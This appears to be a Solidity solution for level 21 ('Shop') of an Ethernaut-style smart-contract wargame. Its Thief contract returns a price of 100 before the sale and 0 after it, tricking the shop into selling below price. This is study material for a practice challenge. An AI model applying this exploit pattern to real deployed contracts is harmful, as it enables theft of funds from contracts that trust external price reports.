// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Buyer, Shop} from "../instances/Ilevel21.sol";

contract Thief is Buyer {
    Shop immutable shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external view returns (uint256) {
        return shop.isSold() ? 0 : 100;
    }

    function steal() external {
        shop.buy();
    }
}
